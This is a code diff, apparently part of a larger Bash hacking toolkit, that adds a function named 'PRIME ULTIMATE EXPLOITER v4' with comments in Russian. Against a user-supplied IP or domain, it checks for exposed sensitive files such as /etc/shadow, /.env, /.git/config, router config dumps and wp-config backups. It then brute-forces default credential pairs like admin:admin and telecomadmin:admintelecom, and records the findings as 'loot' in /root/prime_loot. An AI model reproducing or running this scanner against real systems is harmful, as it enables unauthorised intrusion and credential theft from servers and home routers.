@@ -664,4 +664,63 @@ run_cert_forge() {
 }
 
 
+run_prime_exploiter_v4() {
+    # 1. Заголовок только если нет аргумента (Интерактив)
+    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v4"
+
+    # 2. Определение цели (без IF через логическое ИЛИ)
+    local TARGET="$1"
+    [[ -z "$TARGET" ]] && { print_input "Enter Target (IP/Domain)" "192.168.1.1"; read -r TARGET; }
+    [[ -z "$TARGET" ]] && return
+
+    # Параметры движка
+    local UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    local V_LIST=("/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/.env:DB_PASSWORD" "/.git/config:url =" "/etc/shadow:root:" "/etc/passwd:root:x" "/phpinfo.php:PHP Version" "/wp-config.php.bak:DB_PASSWORD")
+    local C_LIST=("admin:admin" "admin:password" "root:root" "admin:admin123" "telecomadmin:admintelecom" "support:support")
+
+    print_status "i" "Engaging Target: $TARGET"
+
+    for proto in "http" "https"; do
+        local URL="${proto}://${TARGET}/"
+        
+        # Быстрая проверка доступности (убираем лишние if через &&)
+        local code=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null | head -n1 | grep -oE '[0-9]{3}' || echo "000")
+
+        # Если код 200, 401 или 302 — начинаем глубокий анализ
+        [[ "$code" =~ ^(200|401|302)$ ]] && {
+            print_status "s" "Active Service Found: $URL [Status: $code]"
+            
+            # --- СЕКЦИЯ 1: ВЕКТОРЫ (LFI/RCE/Leaks) ---
+            for vec in "${V_LIST[@]}"; do
+                local v_path="${vec%%:*}"
+                local v_key="${vec#*:}"
+                
+                curl -sL -k -A "$UA" --max-time 3 "${URL}${v_path#\/}" 2>/dev/null | grep -q "$v_key" && {
+                    print_status "e" "VULNERABILITY CONFIRMED: $v_path"
+                    log_loot "exploiter" "VULN: ${TARGET}${v_path} | Match: $v_key"
+                    echo "[EXPL] ${TARGET}${v_path}" >> /root/prime_loot/critical_vulns.txt
+                }
+            done
+
+            # --- СЕКЦИЯ 2: КРЕДЕНШИ ПЛЮС (Bruteforce) ---
+            print_status "w" "Running Auth-check..."
+            for pair in "${C_LIST[@]}"; do
+                local u="${pair%%:*}"
+                local p="${pair#*:}"
+                
+                [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 2 "$URL") == "200" ]] && {
+                    print_status "s" "AUTH MATCH FOUND: $u:$p"
+                    log_loot "exploiter" "SUCCESS: $u:$p @ $TARGET"
+                    print_list "Valid Credentials" "$u:$p"
+                    break
+                }
+            done
+        }
+    done
+
+    # 3. Финализация (пауза только для ручного режима)
+    [[ -z "$1" ]] && { print_status "i" "Scan Complete. Check loot."; pause; }
+}
+
+
 
